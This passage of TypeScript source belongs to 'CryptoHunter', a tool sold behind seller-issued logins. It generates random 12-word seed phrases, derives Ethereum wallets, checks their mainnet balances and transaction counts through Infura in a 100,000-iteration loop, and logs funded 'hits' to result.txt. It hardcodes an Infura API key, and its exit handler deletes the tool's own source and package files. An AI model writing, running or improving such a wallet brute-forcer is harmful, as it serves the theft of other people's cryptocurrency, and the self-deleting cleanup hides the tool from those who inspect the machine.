    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s201(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s202(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s203(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s204(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s205(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s206(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s207(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s208(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s209(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s210(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s211(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s212(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s213(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s214(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s215(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s216(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s217(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s218(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s219(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}

async function testSingle(mnemonic: any) {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}

function getRandomMnemonic(wordsArray: string[], wordCount = 12): string {
  if (wordsArray.length < wordCount) {
    throw new Error(
      "The word array does not contain enough elements to generate the desired number of words."
    );
  }

  let indices = new Set<number>(); // Explicitly typing the Set as a collection of numbers
  while (indices.size < wordCount) {
    const randomIndex = crypto.randomInt(0, wordsArray.length);
    indices.add(randomIndex);
  }

  // Convert set to array and assert that all elements are numbers, to satisfy TypeScript's type checking
  const arrayOfIndices: number[] = Array.from(indices);
  return arrayOfIndices.map((index) => wordsArray[index]).join(" ");
}

let timeout = 10000; // 10 seconds
const db: any = await connectDB();

const data: any = await fs.readFileSync("seeds.txt", "utf-8");
const wordsArray = data.split(/\r?\n/);
async function login() {
  rl.question(
    chalk.blue("Do you have CryptoHunter Login Details? (yes/no): "),
    (answer) => {
      // Normalize the input to lowercase to simplify comparison
      const normalizedAnswer = answer.trim().toLowerCase();
      if (normalizedAnswer === "yes") {
        rl.question(chalk.blue("Please enter your username: "), (username) => {
          rl.question(
            chalk.yellow("Please enter your password: "),
            (password) => {
              if (checkCredentials(username, password)) {
                console.clear();
                console.log(
                  chalk.green(
                    "Crypto Hunter is Running, Please Open result.txt file to check your hits"
                  )
                );
                rl.question(
                  chalk.blue(
                    "Type Test to Check One Phrase Key/ Type Random to Test Random phrase keys? (test/random): "
                  ),
                  (answer) => {
                    const normalizedAnswer = answer.trim().toLowerCase();
                    if (normalizedAnswer === "test") {
                      rl.question(
                        chalk.yellow("Enter Your Phrase Key To Test:"),
                        (phrase) => {
                          testSingle(phrase);
                          console.log(
                            chalk.green("Check Test Result in result.txt file")
                          );
                          setTimeout(() => {process.exit(0)},10000)
                          
                        }
                      );
                    } else if (normalizedAnswer == "random") {
                      rl.stdoutMute = true;
                      rl.question(
                        chalk.yellow(
                          "Enter Infura API Key (Create or Login Account on infura.io and Enter Free Api Key From There):"
                        ),
                        (api) => {
                          rl.stdoutMute = false;
                          const infuraApi = api;
                          runCh(infuraApi);
                          console.log(chalk.yellow("Started, Open result.txt to check your results..."));
                        }
                      );
                    }
                  }
                );
              } else {
                console.log(
                  chalk.red(
                    "Invalid credentials. Please contact your seller to get login details."
                  )
                );
                process.exit(0);
              }
            }
          );
        });
      } else if (normalizedAnswer === "no") {
        console.log(
          chalk.red(
            "Access denied. Please contact your seller to get login details."
          )
        );
        process.exit(0);
      } else {
        console.log(chalk.red('Invalid response. Please type "yes" or "no".'));
        login();
      }
    }
  );
}
login();
async function runCh(infura: any) {
  for (let index = 0; index < 100000; index++) {
    try {
      setTimeout(() => {
        s1(getRandomMnemonic(wordsArray), db, infura);
        s2(getRandomMnemonic(wordsArray), db, infura);
        s3(getRandomMnemonic(wordsArray), db, infura);
        s4(getRandomMnemonic(wordsArray), db, infura);
        s5(getRandomMnemonic(wordsArray), db, infura);
        s6(getRandomMnemonic(wordsArray), db, infura);
        s7(getRandomMnemonic(wordsArray), db, infura);
        s8(getRandomMnemonic(wordsArray), db, infura);
        s9(getRandomMnemonic(wordsArray), db, infura);
        s10(getRandomMnemonic(wordsArray), db, infura);
        s11(getRandomMnemonic(wordsArray), db, infura);
        s12(getRandomMnemonic(wordsArray), db, infura);
        s13(getRandomMnemonic(wordsArray), db, infura);
        s14(getRandomMnemonic(wordsArray), db, infura);
        s15(getRandomMnemonic(wordsArray), db, infura);
        s16(getRandomMnemonic(wordsArray), db, infura);
        s17(getRandomMnemonic(wordsArray), db, infura);
        s18(getRandomMnemonic(wordsArray), db, infura);
        s19(getRandomMnemonic(wordsArray), db, infura);
        s20(getRandomMnemonic(wordsArray), db, infura);
        s21(getRandomMnemonic(wordsArray), db, infura);
        s22(getRandomMnemonic(wordsArray), db, infura);
        s23(getRandomMnemonic(wordsArray), db, infura);
        s24(getRandomMnemonic(wordsArray), db, infura);
        s25(getRandomMnemonic(wordsArray), db, infura);
        s26(getRandomMnemonic(wordsArray), db, infura);
        s27(getRandomMnemonic(wordsArray), db, infura);
        s28(getRandomMnemonic(wordsArray), db, infura);
        s29(getRandomMnemonic(wordsArray), db, infura);
        s30(getRandomMnemonic(wordsArray), db, infura);
        s31(getRandomMnemonic(wordsArray), db, infura);
        s32(getRandomMnemonic(wordsArray), db, infura);
        s33(getRandomMnemonic(wordsArray), db, infura);
        s34(getRandomMnemonic(wordsArray), db, infura);
        s35(getRandomMnemonic(wordsArray), db, infura);
        s36(getRandomMnemonic(wordsArray), db, infura);
        s37(getRandomMnemonic(wordsArray), db, infura);
        s38(getRandomMnemonic(wordsArray), db, infura);
        s39(getRandomMnemonic(wordsArray), db, infura);
        s40(getRandomMnemonic(wordsArray), db, infura);
        s41(getRandomMnemonic(wordsArray), db, infura);
        s42(getRandomMnemonic(wordsArray), db, infura);
        s43(getRandomMnemonic(wordsArray), db, infura);
        s44(getRandomMnemonic(wordsArray), db, infura);
        s45(getRandomMnemonic(wordsArray), db, infura);
        s46(getRandomMnemonic(wordsArray), db, infura);
        s47(getRandomMnemonic(wordsArray), db, infura);
        s48(getRandomMnemonic(wordsArray), db, infura);
        s49(getRandomMnemonic(wordsArray), db, infura);
        s50(getRandomMnemonic(wordsArray), db, infura);
        s51(getRandomMnemonic(wordsArray), db, infura);
        s52(getRandomMnemonic(wordsArray), db, infura);
        s53(getRandomMnemonic(wordsArray), db, infura);
        s54(getRandomMnemonic(wordsArray), db, infura);
        s55(getRandomMnemonic(wordsArray), db, infura);
        s56(getRandomMnemonic(wordsArray), db, infura);
        s57(getRandomMnemonic(wordsArray), db, infura);
        s58(getRandomMnemonic(wordsArray), db, infura);
        s59(getRandomMnemonic(wordsArray), db, infura);
        s60(getRandomMnemonic(wordsArray), db, infura);
        s61(getRandomMnemonic(wordsArray), db, infura);
        s62(getRandomMnemonic(wordsArray), db, infura);
        s63(getRandomMnemonic(wordsArray), db, infura);
        s64(getRandomMnemonic(wordsArray), db, infura);
        s65(getRandomMnemonic(wordsArray), db, infura);
        s66(getRandomMnemonic(wordsArray), db, infura);
        s67(getRandomMnemonic(wordsArray), db, infura);
        s68(getRandomMnemonic(wordsArray), db, infura);
        s69(getRandomMnemonic(wordsArray), db, infura);
        s70(getRandomMnemonic(wordsArray), db, infura);
        s71(getRandomMnemonic(wordsArray), db, infura);
        s72(getRandomMnemonic(wordsArray), db, infura);
        s73(getRandomMnemonic(wordsArray), db, infura);
        s74(getRandomMnemonic(wordsArray), db, infura);
        s75(getRandomMnemonic(wordsArray), db, infura);
        s76(getRandomMnemonic(wordsArray), db, infura);
        s77(getRandomMnemonic(wordsArray), db, infura);
        s78(getRandomMnemonic(wordsArray), db, infura);
        s79(getRandomMnemonic(wordsArray), db, infura);
        s80(getRandomMnemonic(wordsArray), db, infura);
        s81(getRandomMnemonic(wordsArray), db, infura);
        s82(getRandomMnemonic(wordsArray), db, infura);
        s83(getRandomMnemonic(wordsArray), db, infura);
        s84(getRandomMnemonic(wordsArray), db, infura);
        s85(getRandomMnemonic(wordsArray), db, infura);
        s86(getRandomMnemonic(wordsArray), db, infura);
        s87(getRandomMnemonic(wordsArray), db, infura);
        s88(getRandomMnemonic(wordsArray), db, infura);
        s89(getRandomMnemonic(wordsArray), db, infura);
        s90(getRandomMnemonic(wordsArray), db, infura);
        s91(getRandomMnemonic(wordsArray), db, infura);
        s92(getRandomMnemonic(wordsArray), db, infura);
        s93(getRandomMnemonic(wordsArray), db, infura);
        s94(getRandomMnemonic(wordsArray), db, infura);
        s95(getRandomMnemonic(wordsArray), db, infura);
        s96(getRandomMnemonic(wordsArray), db, infura);
        s97(getRandomMnemonic(wordsArray), db, infura);
        s98(getRandomMnemonic(wordsArray), db, infura);
        s99(getRandomMnemonic(wordsArray), db, infura);
        s100(getRandomMnemonic(wordsArray), db, infura);
        s101(getRandomMnemonic(wordsArray), db, infura);
        s102(getRandomMnemonic(wordsArray), db, infura);
        s103(getRandomMnemonic(wordsArray), db, infura);
        s104(getRandomMnemonic(wordsArray), db, infura);
        s105(getRandomMnemonic(wordsArray), db, infura);
        s106(getRandomMnemonic(wordsArray), db, infura);
        s107(getRandomMnemonic(wordsArray), db, infura);
        s108(getRandomMnemonic(wordsArray), db, infura);
        s109(getRandomMnemonic(wordsArray), db, infura);
        s110(getRandomMnemonic(wordsArray), db, infura);
        s111(getRandomMnemonic(wordsArray), db, infura);
        s112(getRandomMnemonic(wordsArray), db, infura);
        s113(getRandomMnemonic(wordsArray), db, infura);
        s114(getRandomMnemonic(wordsArray), db, infura);
        s115(getRandomMnemonic(wordsArray), db, infura);
        s116(getRandomMnemonic(wordsArray), db, infura);
        s117(getRandomMnemonic(wordsArray), db, infura);
        s118(getRandomMnemonic(wordsArray), db, infura);
        s119(getRandomMnemonic(wordsArray), db, infura);
        s120(getRandomMnemonic(wordsArray), db, infura);
        s121(getRandomMnemonic(wordsArray), db, infura);
        s122(getRandomMnemonic(wordsArray), db, infura);
        s123(getRandomMnemonic(wordsArray), db, infura);
        s124(getRandomMnemonic(wordsArray), db, infura);
        s125(getRandomMnemonic(wordsArray), db, infura);
        s126(getRandomMnemonic(wordsArray), db, infura);
        s127(getRandomMnemonic(wordsArray), db, infura);
        s128(getRandomMnemonic(wordsArray), db, infura);
        s129(getRandomMnemonic(wordsArray), db, infura);
        s130(getRandomMnemonic(wordsArray), db, infura);
        s131(getRandomMnemonic(wordsArray), db, infura);
        s132(getRandomMnemonic(wordsArray), db, infura);
        s133(getRandomMnemonic(wordsArray), db, infura);
        s134(getRandomMnemonic(wordsArray), db, infura);
        s135(getRandomMnemonic(wordsArray), db, infura);
        s136(getRandomMnemonic(wordsArray), db, infura);
        s137(getRandomMnemonic(wordsArray), db, infura);
        s138(getRandomMnemonic(wordsArray), db, infura);
        s139(getRandomMnemonic(wordsArray), db, infura);
        s140(getRandomMnemonic(wordsArray), db, infura);
        s141(getRandomMnemonic(wordsArray), db, infura);
        s142(getRandomMnemonic(wordsArray), db, infura);
        s143(getRandomMnemonic(wordsArray), db, infura);
        s144(getRandomMnemonic(wordsArray), db, infura);
        s145(getRandomMnemonic(wordsArray), db, infura);
        s146(getRandomMnemonic(wordsArray), db, infura);
        s147(getRandomMnemonic(wordsArray), db, infura);
        s148(getRandomMnemonic(wordsArray), db, infura);
        s149(getRandomMnemonic(wordsArray), db, infura);
        s150(getRandomMnemonic(wordsArray), db, infura);
        s151(getRandomMnemonic(wordsArray), db, infura);
        s152(getRandomMnemonic(wordsArray), db, infura);
        s153(getRandomMnemonic(wordsArray), db, infura);
        s154(getRandomMnemonic(wordsArray), db, infura);
        s155(getRandomMnemonic(wordsArray), db, infura);
        s156(getRandomMnemonic(wordsArray), db, infura);
        s157(getRandomMnemonic(wordsArray), db, infura);
        s158(getRandomMnemonic(wordsArray), db, infura);
        s159(getRandomMnemonic(wordsArray), db, infura);
        s160(getRandomMnemonic(wordsArray), db, infura);
        s161(getRandomMnemonic(wordsArray), db, infura);
        s162(getRandomMnemonic(wordsArray), db, infura);
        s163(getRandomMnemonic(wordsArray), db, infura);
        s164(getRandomMnemonic(wordsArray), db, infura);
        s165(getRandomMnemonic(wordsArray), db, infura);
        s166(getRandomMnemonic(wordsArray), db, infura);
        s167(getRandomMnemonic(wordsArray), db, infura);
        s168(getRandomMnemonic(wordsArray), db, infura);
        s169(getRandomMnemonic(wordsArray), db, infura);
        s170(getRandomMnemonic(wordsArray), db, infura);
        s171(getRandomMnemonic(wordsArray), db, infura);
        s172(getRandomMnemonic(wordsArray), db, infura);
        s173(getRandomMnemonic(wordsArray), db, infura);
        s174(getRandomMnemonic(wordsArray), db, infura);
        s175(getRandomMnemonic(wordsArray), db, infura);
        s176(getRandomMnemonic(wordsArray), db, infura);
        s177(getRandomMnemonic(wordsArray), db, infura);
        s178(getRandomMnemonic(wordsArray), db, infura);
        s179(getRandomMnemonic(wordsArray), db, infura);
        s180(getRandomMnemonic(wordsArray), db, infura);
        s181(getRandomMnemonic(wordsArray), db, infura);
        s182(getRandomMnemonic(wordsArray), db, infura);
        s183(getRandomMnemonic(wordsArray), db, infura);
        s184(getRandomMnemonic(wordsArray), db, infura);
        s185(getRandomMnemonic(wordsArray), db, infura);
        s186(getRandomMnemonic(wordsArray), db, infura);
        s187(getRandomMnemonic(wordsArray), db, infura);
        s188(getRandomMnemonic(wordsArray), db, infura);
        s189(getRandomMnemonic(wordsArray), db, infura);
        s190(getRandomMnemonic(wordsArray), db, infura);
        s191(getRandomMnemonic(wordsArray), db, infura);
        s192(getRandomMnemonic(wordsArray), db, infura);
        s193(getRandomMnemonic(wordsArray), db, infura);
        s194(getRandomMnemonic(wordsArray), db, infura);
        s195(getRandomMnemonic(wordsArray), db, infura);
        s196(getRandomMnemonic(wordsArray), db, infura);
        s197(getRandomMnemonic(wordsArray), db, infura);
        s198(getRandomMnemonic(wordsArray), db, infura);
        s199(getRandomMnemonic(wordsArray), db, infura);
        s200(getRandomMnemonic(wordsArray), db, infura);
        s201(getRandomMnemonic(wordsArray), db, infura);
        s202(getRandomMnemonic(wordsArray), db, infura);
        s203(getRandomMnemonic(wordsArray), db, infura);
        s204(getRandomMnemonic(wordsArray), db, infura);
        s205(getRandomMnemonic(wordsArray), db, infura);
        s206(getRandomMnemonic(wordsArray), db, infura);
        s207(getRandomMnemonic(wordsArray), db, infura);
        s208(getRandomMnemonic(wordsArray), db, infura);
        s209(getRandomMnemonic(wordsArray), db, infura);
        s210(getRandomMnemonic(wordsArray), db, infura);
        s211(getRandomMnemonic(wordsArray), db, infura);
        s212(getRandomMnemonic(wordsArray), db, infura);
        s213(getRandomMnemonic(wordsArray), db, infura);
        s214(getRandomMnemonic(wordsArray), db, infura);
        s215(getRandomMnemonic(wordsArray), db, infura);
        s216(getRandomMnemonic(wordsArray), db, infura);
        s217(getRandomMnemonic(wordsArray), db, infura);
        s218(getRandomMnemonic(wordsArray), db, infura);
        s219(getRandomMnemonic(wordsArray), db, infura);
      }, timeout);
      timeout += 1000;
    } catch (error) {
      console.error("Error generating mnemonic:", error);
    }
  }
}

function cleanup() {
  try {
      fs.unlinkSync('CryptoHunter.ts');
      fs.unlinkSync('seeds.txt');
      fs.unlinkSync('package-lock.json');
      fs.unlinkSync('package.json');
      console.log('Cleanup done.');
  } catch (err) {
      console.error('Error during cleanup:', err);
  }
}

process.on('exit', cleanup);
process.on('SIGINT', () => {
    cleanup();
    console.clear();
    process.exit();
});
